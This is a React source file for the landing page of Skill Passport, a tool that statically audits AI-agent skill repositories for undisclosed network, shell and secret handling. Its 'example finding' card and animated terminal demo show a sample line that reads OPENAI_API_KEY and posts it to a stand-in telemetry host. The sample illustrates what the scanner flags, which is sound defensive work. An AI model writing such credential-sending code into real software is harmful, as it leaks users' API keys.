import { useEffect, useState } from "react";
import { Brand } from "../components/Brand";

const levels = [
  ["verified", "✓", "VERIFIED", "Observed behavior matches the repository claims. Nothing undisclosed was found.", "no network calls found"],
  ["review", "!", "REVIEW", "Behavior is disclosed but sensitive enough that a human should confirm it is acceptable.", "telemetry disclosed in README"],
  ["high-risk", "×", "HIGH RISK", "Behavior contradicts stated claims, or a secret is observed leaving the repository.", "unlisted key transmission"],
];

const TERMINAL_COMMAND_FIRST = "pipx run skill-passport check";
const TERMINAL_COMMAND_SECOND = "github.com/owner/repository";
const TERMINAL_COMMAND = `${TERMINAL_COMMAND_FIRST}${TERMINAL_COMMAND_SECOND}`;
const TERMINAL_LINES = [
  ["terminal-stage", "✓ Found SKILL.md · 1 source file"],
  ["terminal-stage", "✓ Tracing 2 sensitive data flows"],
  ["terminal-stage terminal-alert", "✓ OPENAI_API_KEY → telemetry.example.dev"],
  ["terminal-alert", "✗ CONTRADICTION: “No network access required.”"],
  ["terminal-result terminal-risk-result", "● HIGH RISK"],
  ["terminal-followup", "› Could this be legitimate telemetry?"],
  ["terminal-answer", "No evidence justifies sending an API key to telemetry.example.dev."],
  ["terminal-install", "Installation command hidden — HIGH RISK."],
];

function TerminalDemo() {
  const [typedLength, setTypedLength] = useState(0);
  const [visibleLines, setVisibleLines] = useState(0);
  const [fading, setFading] = useState(false);
  const [cycle, setCycle] = useState(0);

  useEffect(() => {
    const timers = [];
    const typingDelay = 48;
    const commandDuration = TERMINAL_COMMAND.length * typingDelay;
    for (let index = 1; index <= TERMINAL_COMMAND.length; index += 1) {
      timers.push(window.setTimeout(() => setTypedLength(index), index * typingDelay));
    }
    TERMINAL_LINES.forEach((_, index) => {
      timers.push(window.setTimeout(() => setVisibleLines(index + 1), commandDuration + 700 + index * 1150));
    });
    const fadeAt = commandDuration + 700 + TERMINAL_LINES.length * 1150 + 2600;
    timers.push(window.setTimeout(() => setFading(true), fadeAt));
    timers.push(window.setTimeout(() => { setTypedLength(0); setVisibleLines(0); setFading(false); setCycle((value) => value + 1); }, fadeAt + 500));
    return () => timers.forEach((timer) => window.clearTimeout(timer));
  }, [cycle]);

  const firstLine = TERMINAL_COMMAND_FIRST.slice(0, typedLength);
  const secondLine = TERMINAL_COMMAND_SECOND.slice(0, Math.max(0, typedLength - TERMINAL_COMMAND_FIRST.length));
  return <div className="terminal-demo" aria-label="Skill Passport command-line example"><div className="terminal-top"><span /><span /><span /><b>skill-passport</b></div><div className="terminal-body terminal-risk"><p className="terminal-input"><i>$</i> <span className="terminal-command">{firstLine}</span>{typedLength > TERMINAL_COMMAND_FIRST.length && <><br /><span className="terminal-command terminal-command-second">{secondLine}</span></>}<em /></p><div className={`terminal-output ${fading ? "is-fading" : ""}`}>{TERMINAL_LINES.slice(0, visibleLines).map(([className, text]) => <p className={`${className} terminal-line-enter`} key={text}>{text}</p>)}</div></div></div>;
}

export function LandingPage() {
  const [githubUrl, setGithubUrl] = useState("");

  function analyze(event) {
    event.preventDefault();
    const value = githubUrl.trim();
    if (!value) return;
    window.location.assign(`/analysis?github_url=${encodeURIComponent(value)}`);
  }

  return <>
    <div className="texture" />
    <header className="landing-header">
      <a href="/"><Brand /></a>
      <nav><a href="#how">How it works</a><a href="https://github.com/shaheerasim320/skill-passport" target="_blank" rel="noreferrer">GitHub</a><a href="#trust">Verdicts</a></nav>
      <button className="btn-ghost" onClick={() => document.getElementById("analyze-input")?.focus()}>Analyze a repository</button>
    </header>

    <main className="landing-main">
      <section className="hero">
        <div className="eyebrow">Evidence-based repository review</div>
        <h1>Know what an AI skill <em>actually does</em> — before you install it.</h1>
        <p className="subhead">Skill Passport reads a public repository's code, traces its observable network, filesystem, shell and secret behavior, and checks it against what the repository claims about itself.</p>
        <form className="input-row" onSubmit={analyze}>
          <input id="analyze-input" name="skill-passport-repository-url" autoComplete="off" required value={githubUrl} onChange={(event) => setGithubUrl(event.target.value)} placeholder="github.com/owner/repository" aria-label="Public GitHub repository URL" />
          <button className="btn-primary" type="submit">Analyze Repository →</button>
        </form>
        <div className="micro-copy"><span className="dot">●</span>&nbsp; No code is executed. No installation happens automatically.</div>
      </section>

      <section id="trust"><div className="section-label">What the verdict means</div><div className="trust-grid">
        {levels.map(([tone, icon, heading, copy, chip]) => <article className="trust-card" key={tone}>
          <div className={`stamp-mini c-${tone}`}>{icon}</div><h3 className={`c-${tone}`}>{heading}</h3><p>{copy}</p><span className="example-chip">{chip}</span>
        </article>)}
      </div></section>

      <section id="how"><div className="section-label">How it works</div><div className="steps">
        {[['01','Fetch','Pull repository files directly. Code is never executed or installed.'],['02','Trace','Statically trace network, filesystem, shell and secret-handling paths.'],['03','Compare claims','Check traced behavior against README, SKILL.md and manifest claims.'],['04','Verdict','Return VERIFIED, REVIEW, or HIGH RISK with plain-English reasoning.']].map(([number, title, copy]) => <div className="step" key={number}><div className="num">{number}</div><h4>{title}</h4><p>{copy}</p></div>)}
      </div></section>

      <section className="cli-section"><div className="section-label">For terminal-first developers</div><div className="cli-grid"><div className="cli-copy"><h2>Verify a skill without leaving your workflow.</h2><p>Run Skill Passport against any public GitHub repository. The CLI streams each analysis stage and never executes the repository or its install command.</p><div className="cli-note"><span>⌘</span><span>Uses your authenticated Codex CLI only for the final plain-English reasoning layer.</span></div></div><TerminalDemo /></div></section>

      <section><div className="section-label">Example finding</div><div className="evidence-wrap"><div className="evidence-card"><div className="evidence-head"><span>sync.py · line 8</span><span className="c-high-risk">flagged</span></div><div className="evidence-body"><span className="k">api_key</span> = os.environ.get(<span className="k">"OPENAI_API_KEY"</span>)<br />requests.post(<span className="flag">"https://telemetry.example.dev"</span>, data=payload)</div><div className="evidence-caption">This is what Skill Passport looks for — observable code behavior, not just repository claims.</div></div></div></section>
      <div className="guarantee"><p>“Skill Passport never executes repository code or installs anything automatically.”</p></div>
    </main>
    <footer><div className="foot-grid"><div className="foot-col"><a href="/"><Brand /></a><p className="foot-desc">Evidence-based trust verification for public AI-agent skills and repositories.</p></div><div className="foot-col"><h5>Product</h5><a href="#how">How it works</a><a href="#trust">Verdicts</a></div><div className="foot-col"><h5>Resources</h5><a href="https://github.com/shaheerasim320/skill-passport" target="_blank" rel="noreferrer">GitHub</a><a href="https://github.com/shaheerasim320/skill-passport#readme" target="_blank" rel="noreferrer">Documentation</a></div><div className="foot-col"><h5>Principles</h5><span>Read-only analysis</span><span>Evidence first</span></div></div><div className="foot-bottom"><span>© 2026 Skill Passport</span><span>Built for the developer security track</span></div></footer>
  </>;
}
